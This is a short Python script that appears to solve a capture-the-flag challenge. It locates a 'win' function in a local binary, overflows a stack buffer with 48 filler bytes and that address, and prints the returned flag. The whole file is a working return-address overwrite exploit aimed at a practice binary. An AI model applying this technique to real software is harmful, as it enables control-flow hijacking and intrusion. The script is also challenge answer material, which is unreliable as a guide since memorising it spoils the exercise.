#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    nm = subprocess.check_output(["nm", "-an", binary], text=True)
    win = int(next(line.split()[0] for line in nm.splitlines() if " win" in line), 16)
    payload = b"A" * 48 + struct.pack("<Q", win)
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
